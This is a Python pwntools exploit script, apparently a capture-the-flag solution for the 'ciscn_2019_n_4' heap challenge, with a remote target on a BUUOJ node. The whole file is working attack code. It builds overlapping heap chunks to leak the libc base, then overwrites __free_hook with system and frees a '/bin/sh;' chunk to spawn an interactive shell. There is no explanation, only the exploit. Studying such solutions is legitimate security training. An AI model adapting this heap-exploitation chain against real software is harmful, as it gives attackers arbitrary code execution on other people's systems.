import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_n_4')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_n_4')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',26425)
			elf=ELF('./ciscn_2019_n_4')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		def add(a,b):
			io.sendlineafter('Your choice :','1')
			io.sendlineafter('how big is the nest ?',str(a))
			io.sendafter('what stuff you wanna put in the nest?',b)

		def edit(a,b):
			io.sendlineafter('Your choice :','2')
			io.sendlineafter('Index :',str(a))
			io.sendafter('what stuff you wanna put in the nest?',b)

		def show(a):
			io.sendlineafter('Your choice :','3')
			io.sendlineafter('Index :',str(a))

		def delete(a):
			io.sendlineafter('Your choice :','4')
			io.sendlineafter('Index :',str(a))

		
		add(0x4f0,'aaa')
		add(0x10,'aaa')
		#delete(0)
		delete(1)
		add(0xb8,'aaa')
		add(0x4f8,'aaaaaaaa')
		edit(1,'\x00'*0xb0+p64(0x600)+'\x00')
		delete(0)
		delete(2)
		add(0x4f8,'/bin/sh;')
		show(0)
		io.recvuntil('/bin/sh;')
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base

		add(0x38,p64(0x8)+p64(libc.sym['__free_hook']))
		edit(1,p64(libc.sym['system']))
		delete(0)
		
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue